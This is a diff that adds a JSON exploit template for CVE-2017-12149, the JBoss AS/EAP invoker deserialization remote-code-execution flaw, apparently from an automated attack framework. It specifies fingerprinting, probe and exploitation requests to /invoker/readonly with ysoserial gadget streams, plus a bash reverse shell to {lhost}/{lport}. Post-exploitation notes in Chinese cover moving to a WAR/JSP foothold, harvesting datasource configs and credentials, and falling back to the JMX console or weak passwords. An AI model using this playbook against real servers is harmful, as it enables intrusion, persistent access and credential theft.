@@ -1,0 +1,117 @@
+{
+  "id": "jboss-cve-2017-12149-invoker-rce",
+  "family": "jboss",
+  "product": "JBoss AS / EAP",
+  "cve": "CVE-2017-12149",
+  "aliases": [
+    "JBoss invoker deserialization RCE"
+  ],
+  "severity": "critical",
+  "tags": [
+    "jboss",
+    "invoker",
+    "serialization",
+    "java",
+    "rce"
+  ],
+  "applicability": {
+    "versions": [
+      "JBoss Application Server 5.x",
+      "JBoss EAP 5.x"
+    ],
+    "fingerprints": [
+      "/invoker/readonly reachable",
+      "Legacy JBoss remoting / invoker servlet endpoints exposed",
+      "Error pages or headers indicate JBoss AS / EAP"
+    ],
+    "signals": [
+      "POST to /invoker/readonly yields JBoss-specific exception or serialized stream handling",
+      "Legacy invoker servlet is accessible without strong auth",
+      "The target classpath likely supports common ysoserial gadgets"
+    ]
+  },
+  "preconditions": [
+    "The invoker servlet endpoint must be reachable.",
+    "A compatible gadget chain must exist on the target classpath.",
+    "The operator should have a safe plan to validate classpath compatibility before repeated payloads."
+  ],
+  "verification": {
+    "method": "http_post",
+    "requests": [
+      {
+        "path": "/invoker/readonly",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "application/x-java-serialized-object",
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "SERIALIZED_BENIGN_PROBE_OR_INVALID_STREAM",
+        "matchers": [
+          "JBoss-specific deserialization error or 500 path",
+          "Endpoint behaves differently from generic 404/405"
+        ]
+      }
+    ]
+  },
+  "exploitation": {
+    "mode": "rce",
+    "requests": [
+      {
+        "path": "/invoker/readonly",
+        "method": "POST",
+        "headers": {
+          "Content-Type": "application/x-java-serialized-object",
+          "User-Agent": "Mozilla/5.0"
+        },
+        "data": "YSOSERIAL_GADGET_STREAM_FOR_ID_OR_WHOAMI",
+        "os_hint": "unknown"
+      }
+    ]
+  },
+  "post_exploitation": {
+    "stabilization": [
+      "命中反序列化后优先收集 JBoss home、server profile、deploy 目录和数据源配置。",
+      "尽快把控制切到更稳定的 JSP/WAR、管理控制台或凭据复用，而不是持续依赖 gadget 流。",
+      "记录成功使用的 gadget 链和 classpath 线索，后续尽量复用同一条链。"
+    ],
+    "shell_options": [
+      {
+        "type": "ysoserial_stage",
+        "template": "Generate a gadget stream executing {command} and POST it to /invoker/readonly"
+      },
+      {
+        "type": "bash_reverse_shell",
+        "template": "Wrap /bin/sh -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' inside the chosen gadget command"
+      }
+    ]
+  },
+  "stability": {
+    "preferred_order": [
+      "先确认 /invoker/readonly 真实存在并有反序列化行为。",
+      "先用最小化 gadget 或 benign probe 验证 classpath。",
+      "成功后迅速切换到部署型 foothold 或配置/凭据侧证据。"
+    ],
+    "safe_commands": [
+      "id",
+      "whoami",
+      "pwd",
+      "hostname"
+    ],
+    "shell_prerequisites": [
+      "确认可用的 ysoserial 或等价 gadget 生成链。",
+      "确认响应、日志或 side-channel 足以判断 gadget 是否被执行。"
+    ],
+    "fallbacks": [
+      "如果 invoker endpoint 不在，转向 JMX console、admin-console、弱口令或已部署应用面。",
+      "如果 gadget 不兼容，先收集版本与依赖，再换链。"
+    ]
+  },
+  "detection_notes": [
+    "反序列化链更依赖 classpath 与 Java 版本，不宜把无差别 gadget 当作首选。",
+    "比赛环境里优先低频验证，再转向更稳定的控制方法。"
+  ],
+  "references": [
+    "Red Hat advisory for CVE-2017-12149",
+    "Public JBoss invoker deserialization analyses"
+  ]
+}
